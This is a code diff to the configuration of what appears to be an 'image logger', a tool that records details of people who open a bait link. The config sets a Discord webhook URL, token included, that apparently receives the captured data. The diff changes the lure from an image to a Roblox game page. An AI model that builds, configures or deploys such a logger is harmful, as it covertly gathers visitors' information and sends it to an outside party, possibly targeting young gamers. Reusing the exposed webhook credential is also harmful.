@@ -10,7 +10,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1412460994680061962/Lr9R0WafZz8FRkCLtglMyIFWhivlnKRv9ao0R1pR04C_Qty--W1CQ42KocgN4a9Rnp8Z",
-    "image": "https://i.pinimg.com/736x/fc/65/d1/fc65d16195fd11a9bfcf5d94773c7802.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://www.roblox.com/games/113149714573083/BETA-Death-Experience", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
